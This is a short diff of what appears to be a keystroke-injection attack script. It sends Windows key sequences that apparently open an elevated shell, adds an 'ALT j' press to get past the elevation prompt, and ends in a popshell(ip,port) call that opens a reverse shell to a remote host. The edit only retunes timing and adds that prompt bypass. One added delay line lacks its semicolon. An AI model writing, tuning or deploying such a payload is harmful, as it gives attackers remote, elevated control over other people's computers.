@@ -33,7 +33,9 @@ typingSpeed(0,0);
 press("GUI x");
 delay(2000);
 press("SHIFT a");
-delay(11000);
+delay(8000)
+press("ALT j");
+delay(3000);
 //hide();
 delay(2000);
 popshell(ip,port);
